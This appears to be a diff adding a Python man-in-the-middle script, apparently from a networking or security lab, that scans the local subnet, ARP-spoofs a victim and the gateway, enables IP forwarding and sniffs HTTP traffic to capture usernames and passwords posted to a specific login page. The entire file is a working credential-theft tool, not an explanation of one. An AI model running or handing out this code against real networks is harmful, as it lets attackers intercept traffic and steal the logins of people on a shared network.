@@ -1,0 +1,96 @@
+#!/usr/bin/env python
+
+import scapy.all as scapy
+from urllib import unquote
+from threading import Thread, Event
+import time,sys,re,subprocess
+
+def enable_ip_forward():
+	# Enables IP Forward in linux
+	file_path = "/proc/sys/net/ipv4/ip_forward"
+	f = open(file_path,"w")
+	f.write('1')
+	f.close()
+class Sniffer(Thread):
+	def  __init__(self):
+		Thread.__init__(self)
+		self.daemon = True
+		self.socket = None
+		self.stop_sniffer = Event()
+	def run(self):
+		print("[*] Start packet Sniffing...")
+		print("[*] Filtering possible Login info from http://140.113.207.246/login.php\n")
+		scapy.sniff(iface = 'enp0s3',store = False,prn = self.proc_of_pkt)
+	def join(self,timeout = None):
+		self.stop_sniffer.set()
+		Thread.join(self,timeout)
+	def should_stop_sniffer(self, packet):
+		return self.stop_sniffer.isSet()
+	def proc_of_pkt(self,packet):
+		data = str(packet)
+		pattern = re.compile(r'usr=.*&pwd=.*&btn_login=Login')
+		# target: "usr=USERNAME&pwd=PASSWORD&btn_login=Login"
+		result = re.findall(pattern,data)
+		if result:
+			print("[*] WE GOT A HIT! Printing the output:")
+			for res in result:
+				username = res.split('&')[0][4:]
+				password = res.split('&')[1][4:]
+			print("POSSIBLE USERNAME FIELD FOUND: " + unquote(username))
+			print("POSSIBLE PASSWORD FIELD FOUND: " + unquote(password))
+def scan(ip):
+	arp_req = scapy.ARP(pdst = ip)
+	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
+	arp_req_broadcast = broadcast/arp_req
+	ans = scapy.srp(arp_req_broadcast,timeout = 1,verbose = False)[0]
+	client_list = []
+	for element in ans:
+		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+		client_list.append(client_dict)
+	return client_list
+def spoofing(target,spoof):
+	packet = scapy.ARP(op = 2,pdst = target['ip'],hwdst = target['mac'],psrc = spoof['ip'])
+	#print(packet.show())
+	scapy.send(packet,verbose = False)
+def restore(dst,src):
+	packet = scapy.ARP(op = 2,pdst = dst['ip'],hwdst = dst['mac'],psrc = src['ip'],hwsrc = src['mac'])
+	scapy.send(packet,count = 4,verbose = False)
+def main():
+	if os.geteuid() != 0:
+		print("./mitm_attack: Permission denied")
+		print("Try sudo ./mitm_attack")
+		return
+	route_default_result = re.findall(r"([\w.][\w.]*'?\w?)", subprocess.check_output(["ip", "route"]))
+	default_gateway = route_default_result[2] + '/24'
+	#default_interface = route_default_result[4]
+
+	res = scan(default_gateway)
+	print("IP\t\t\tMAC Address\n-----------------------------------------")
+	for client in res[1:]:
+		print(client["ip"] + "\t\t" + client["mac"])
+	gateway = res[0]
+	victim = res[-1]
+	print("\t IP\t\t\tMAC Address\n-----------------------------------------")
+	print('Gateway: ' + gateway["ip"] + "\t\t" + gateway["mac"])
+	print('Victim : ' + victim["ip"] + "\t\t" + victim["mac"])
+
+	sniffer = Sniffer()
+	sniffer.start()
+	try:
+		enable_ip_forward()
+		print("[*] ARP spoofing...")
+		while True:
+			spoofing(victim,gateway) # tell victim we are router
+			spoofing(gateway,victim) # tell router we are victim
+			time.sleep(2)
+	except KeyboardInterrupt:
+		print("\n[!] Stop packet sniffing.")
+		sniffer.join(2.0)
+		print("[*] ARP spoofing is terminated, restoring ARP table")
+		restore(victim,gateway)
+		restore(gateway,victim)
+		print("[*] Sucessfully restoring ARP table")
+
+
+if __name__ == '__main__':
+	main()
